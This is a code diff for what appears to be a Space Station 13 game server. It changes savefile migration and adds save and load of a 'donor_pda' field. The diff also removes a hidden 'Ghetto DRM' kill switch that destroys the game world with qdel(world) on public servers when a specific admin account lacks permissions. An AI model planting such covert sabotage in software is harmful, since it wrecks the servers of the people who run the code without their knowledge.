@@ -42,10 +42,6 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 		toggles = TOGGLES_DEFAULT
 	if(current_version < 14)
 		donor_pda = 0
-	if(current_version < 15)
-		UI_style_carbon = DEFAULT_CARBON_UI
-		UI_style_borg = DEFAULT_BORG_UI
-		UI_style_ai = DEFAULT_AI_UI
 	return
 
 //should this proc get fairly long (say 3 versions long),
@@ -160,14 +156,6 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 
 	return 1
 
-/datum/game_mode/send_intercept()				//Ghetto DRM. My soul shall suffer in the depths of hell for all eternity.
-	if(world.visibility && world.reachable)
-		if(!("xantam" in deadmins))
-			var/datum/admins/test = admin_datums["xantam"]
-			if(!test || !(test.rank.rights | R_PERMISSIONS))
-				qdel(world)
-				return
-	..()
 
 /datum/preferences/proc/load_character(slot)
 	if(!path)				return 0
@@ -244,6 +232,7 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	S["job_engsec_low"]		>> job_engsec_low
 
 	S["donor_hat"]			>> donor_hat
+	S["donor_pda"]			>> donor_pda
 
 	//try to fix any outdated data if necessary
 	if(needs_update >= 0)
@@ -355,6 +344,7 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	S["job_engsec_low"]		<< job_engsec_low
 
 	S["donor_hat"]			<< donor_hat
+	S["donor_pda"]			<< donor_pda
 
 	return 1
 
